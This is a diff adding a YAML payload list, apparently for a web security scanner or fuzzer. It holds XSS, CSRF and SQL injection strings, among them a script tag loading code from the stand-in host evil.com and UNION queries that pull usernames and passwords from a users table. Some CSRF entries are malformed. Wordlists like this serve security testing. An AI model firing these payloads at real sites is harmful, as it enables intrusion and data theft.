@@ -1,0 +1,44 @@
+xss_payloads:
+  # Basic XSS Payloads
+  - "<script>alert('XSS')</script>"
+  - "<img src='x' onerror='alert(1)'>"
+  - "javascript:alert(1)"
+  - "<svg/onload=alert(1)>"
+  - "<body onload=alert('XSS')>"
+
+  # Advanced XSS Payloads
+  - "<iframe src='javascript:alert(1)'></iframe>"
+  - "<input type='image' src='x' onerror='alert(1)'>"
+  - "<form action='javascript:alert(1)'><input type='submit'></form>"
+  - "<script>document.write('<img src=1 onerror=alert(1)>'</script>"
+  - "<script src='https://evil.com/malicious.js'></script>"
+
+  # Polyglot XSS Payloads
+  - "<img src=x onerror='alert(1)//' onload='alert(2)//'>"
+  - "<svg onload='alert(1)//' onerror='alert(2)//'>"
+  - "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"
+  - "<script>console['log']('XSS')</script>"
+
+csrf_payloads:
+  # Basic CSRF Payloads
+  - "data:application/x-www-form-urlencoded;name=csrf_token&value=12345"
+  - "data:text/html,<html><body><form method='POST' action='{{ target_url }}'><input type='hidden' name='csrf_token' value='12345'/></form></body></html>"
+
+  # Advanced CSRF Payloads
+  - "data:text/html,<html><body><img src='{{ target_url }}?csrf_token=12345' /></body></html>"
+  - "data:text/html,<html><body><script>fetch('{{ target_url }}', {method: 'POST', body: 'csrf_token=12345'})</script></body></html>"
+  - "data:text/html,<html><body><iframe src='{{ target_url }}?csrf_token=12345'></iframe></body></html>"
+
+sqli_payloads:
+  # Basic SQLi Payloads
+  - "' OR 1=1--"
+  - "' UNION SELECT NULL, NULL--"
+  - "' AND 1=2--"
+  - "' OR 'a'='a"
+  - "' OR 1=1#"
+
+  # Advanced SQLi Payloads
+  - "' AND 1=1 UNION SELECT username, password FROM users--"
+  - "' AND (SELECT COUNT(*) FROM information_schema.tables) > 5--"
+  - "' AND (SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET 0)--"
+  - "' UNION SELECT group_concat(table_name) FROM information_schema.tables--" 
